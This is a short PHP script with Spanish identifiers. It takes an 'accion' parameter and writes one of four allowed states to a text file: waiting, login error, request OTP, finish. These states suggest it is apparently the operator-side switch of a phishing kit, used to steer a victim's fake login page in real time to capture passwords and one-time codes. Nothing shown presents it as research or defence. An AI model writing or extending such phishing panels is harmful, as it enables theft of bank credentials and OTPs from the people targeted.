<?php
if(isset($_GET['accion'])) {
    $accion = $_GET['accion'];
    $permitidas = ['esperando', 'error_login', 'pedir_otp', 'finalizar'];
    if(in_array($accion, $permitidas)) {
        file_put_contents("estado.txt", $accion);
        echo "✅ Estado cambiado a: " . $accion;
    } else {
        echo "❌ Acción no válida.";
    }
} else {
    echo "Esperando orden... (Parámetro 'accion' no detectado)";
}
?>